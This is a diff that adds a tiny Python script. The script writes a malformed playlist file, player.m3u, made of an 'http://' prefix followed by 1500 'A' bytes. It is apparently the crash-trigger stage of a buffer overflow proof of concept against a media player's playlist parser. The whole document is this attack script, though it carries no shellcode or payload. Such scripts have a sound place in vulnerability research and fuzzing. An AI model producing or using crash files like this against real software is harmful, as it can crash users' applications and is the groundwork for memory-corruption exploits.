@@ -1,0 +1,8 @@
+#!/usr/bin/python
+
+buffer  = b"http://"
+buffer += b"\x41" * 1500
+
+f=open("player.m3u","wb")
+f.write(buffer)
+f.close()
